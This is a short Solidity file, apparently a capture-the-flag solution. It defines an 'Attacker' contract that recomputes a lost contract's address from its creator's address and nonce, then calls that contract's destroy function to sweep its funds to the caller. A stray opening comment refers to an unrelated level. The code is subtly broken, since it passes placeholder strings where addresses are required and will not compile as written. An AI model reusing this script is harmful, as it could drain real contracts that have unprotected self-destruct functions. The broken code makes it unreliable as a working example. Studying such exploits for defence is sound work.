//calling a telephone, tx.origin != msg.sender

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}
contract Attacker {
    function run() external {
        address lostcontract = address( //
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            address("creators_address"),
                            bytes1(0x01)
                        )
                    )
                )
            )
        );

        ISimpleToken level15 = ISimpleToken(lostcontract);
        level15.destroy("your_address");
    }
}
